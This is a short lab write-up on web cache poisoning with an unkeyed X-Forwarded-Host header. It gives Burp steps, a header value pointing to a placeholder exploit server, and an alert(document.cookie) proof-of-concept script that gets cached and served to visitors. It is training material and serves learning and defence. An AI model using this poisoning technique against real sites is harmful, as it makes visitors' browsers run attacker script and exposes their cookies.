# Lab 01 — Web Cache Poisoning With an Unkeyed Header

## Objective

Poison the cache so the visitor's browser executes `alert(document.cookie)`.

## Attack Concept

```text
X-Forwarded-Host
      ↓
dynamic resource URL
      ↓
attacker-controlled JavaScript
      ↓
cached response
      ↓
victim loads page
      ↓
JavaScript executes
```

## Step 1 — Find the request

1. Load the home page with Burp running.
2. Open **Proxy > HTTP history**.
3. Find the home-page GET request.
4. Send it to Repeater.

## Step 2 — Test the header

1. Add a cache buster such as `?cb=1234`.
2. Add:

```http
X-Forwarded-Host: example.com
```

3. Send the request.
4. Observe that the header controls the absolute URL for `/resources/js/tracking.js`.

## Step 3 — Prepare the exploit resource

On the exploit server, create:

```text
/resources/js/tracking.js
```

Body:

```javascript
alert(document.cookie)
```

Store the exploit.

## Step 4 — Poison the cache

1. Return to the home-page request.
2. Remove the cache buster.
3. Set:

```http
X-Forwarded-Host: YOUR-EXPLOIT-SERVER-ID.exploit-server.net
```

4. Replay until the exploit-server URL appears in the response and `X-Cache: hit` is present.

## Step 5 — Verify

Load the poisoned URL in the browser and confirm the alert.

The source notes that this lab's cache expires every 30 seconds, so re-poison if necessary.

## Key Learning

The dangerous condition is not merely an unusual header. It is the combination of:

**unkeyed input + unsafe response generation + cacheability + executable resource import.**
